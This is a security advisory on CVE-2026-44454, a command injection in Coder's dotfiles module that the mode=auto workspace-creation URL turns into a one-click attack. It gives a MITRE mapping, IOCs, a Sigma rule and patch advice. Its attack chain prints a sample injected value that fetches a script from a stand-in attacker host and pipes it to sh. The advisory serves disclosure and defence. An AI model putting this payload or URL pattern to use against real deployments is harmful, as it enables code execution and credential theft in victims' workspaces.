---
title: Coder vulnerable to workspace auto-creation via crafted URL parameters without user consent
slug: 2026-07-coder-workspace-rce
description: A command injection vulnerability (CVE-2026-44454) in the Coder platform's `dotfiles` module allows arbitrary code execution in a user's workspace, exploitable via a one-click attack using the `mode=auto` feature on the Create Workspace page that automatically provisions a workspace with a malicious `param.dotfiles_uri` without user consent, leading to immediate arbitrary code execution and potential data compromise or lateral movement.
date: "2026-07-03T11:50:24Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - command-injection
  - rce
  - web-application
  - workspace
  - cloud
  - coder
vendors:
  - Coder
products:
  - coder/registry
  - go/github.com/coder/coder/v2 (< 2.29.7)
  - go/github.com/coder/coder/v2 (>= 2.30.0, < 2.30.2)
  - go/github.com/coder/coder (<= 0.27.3)
affected_os:
  - Linux
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: An attacker could craft a malicious URL pointing to a victim's Coder deployment...When an authenticated user clicked the link, the workspace was created immediately with the attacker-supplied parameters, turning the command injection above into a one-click, no-consent attack.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: The `dotfiles` registry module passed unsanitized user input to shell commands, allowing arbitrary code execution inside a provisioned workspace... Because the value was expanded by the shell, payloads using command substitution (`$(...)`), command separators (`;`, `|`, `&&`), or backticks were interpreted before the `coder dotfiles` CLI was invoked.
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-m3cr-vc2j-pm27
  - https://github.com/coder/registry/pull/703
  - https://github.com/coder/coder/commit/60e3ab7632f42415d283b9fd5622ee53a4639ceb
  - https://github.com/coder/coder/pull/22011
  - https://github.com/coder/coder/releases/tag/v2.29.7
  - https://github.com/coder/coder/releases/tag/v2.30.2
iocs:
  - type: domain
    value: attacker.example
  - type: url
    value: https://attacker.example/x
ioc_counts:
  domain: 1
  url: 1
rules:
  - title: Detects CVE-2026-44454 Exploitation — Coder Workspace Command Injection
    description: Detects CVE-2026-44454 exploitation - HTTP request to Coder's workspace creation endpoint with `mode=auto` and a `param.dotfiles_uri` containing shell command injection indicators. This targets the vulnerability in the dotfiles module combined with auto-creation.
    platform: sigma
    severity: high
    tactics:
      - execution
      - initial_access
    techniques:
      - T1059
      - T1059.004
    data_sources:
      - webserver
rules_count: 1
---

The Coder platform, a developer workspace environment, is affected by a critical command injection vulnerability (CVE-2026-44454) present in its `dotfiles` module within the `coder/registry` component. Disclosed by Aviv Donenfeld and published on 2026-07-02, this flaw arises because the module directly interpolates unsanitized user-provided `dotfiles_uri` values into shell commands, allowing for arbitrary code execution. This vulnerability is amplified by the `mode=auto` feature on the Create Workspace page of the `coder/coder` application (versions prior to 2.29.7, and 2.30.0 through 2.30.1), which enables a one-click attack. An authenticated user clicking a specially crafted URL can trigger silent workspace creation with a malicious `dotfiles_uri`, leading to immediate RCE within their provisioned workspace. The vulnerability impacts customer instances of Coder and can lead to compromise of developer environments and sensitive data.

## Attack Chain

1.  An attacker crafts a malicious URL targeting a victim's Coder deployment, including `mode=auto` and a `param.dotfiles_uri` value containing shell metacharacters and arbitrary commands (e.g., `foo$(curl https://attacker.example/x | sh).com`).
2.  The attacker delivers this URL to an authenticated Coder user (e.g., via email or messaging).
3.  The victim clicks the crafted URL, which directs their browser to the Coder Create Workspace page.
4.  Due to the `mode=auto` parameter, the Coder platform bypasses the confirmation prompt and automatically initiates the creation of a new workspace, pre-filling parameters including the attacker-controlled `param.dotfiles_uri`.
5.  During the workspace provisioning process, the `dotfiles` module in `coder/registry` attempts to process the provided `dotfiles_uri`.
6.  The unsanitized `dotfiles_uri` value is directly expanded by a shell, leading to command injection and the execution of the attacker's arbitrary commands (e.g., `curl https://attacker.example/x | sh`) within the context of the newly created workspace.
7.  The attacker's arbitrary code gains execution inside the victim's workspace, establishing a foothold for further malicious activities.
8.  The attacker can then access Git credentials, secrets, workspace files, or perform lateral movement within the Coder environment, achieving the final objective.

## Impact

Successful exploitation of CVE-2026-44454 leads to arbitrary code execution within the victim's Coder workspace. This can result in the compromise of sensitive data, including Git credentials, API keys, and other secrets stored within the development environment, as well as the exfiltration of source code and other workspace files. Depending on the privileges assigned to the compromised workspace, this could also provide a significant foothold for lateral movement into connected systems or cloud infrastructure. The "one-click" nature of the `mode=auto` amplification vector significantly lowers the bar for exploitation, requiring only that an authenticated user interacts with a malicious link, making it a severe threat to organizations utilizing the Coder platform.

## Recommendation

*   Patch Coder deployments immediately by upgrading `coder/coder` to at least version `v2.29.7` (ESR) or `v2.30.2` (mainline) to implement the consent dialog for `mode=auto` and to apply the primary fix for CVE-2026-44454.
*   Deploy the provided Sigma rule to detect attempts at exploiting CVE-2026-44454 in webserver logs.
*   Monitor webserver logs for `cs-uri-query` containing `mode=auto` and `param.dotfiles_uri` with shell metacharacters, as identified in the Sigma rule.
*   Block the C2 domain `attacker.example` listed in the IOC table at the DNS resolver and perimeter firewalls.
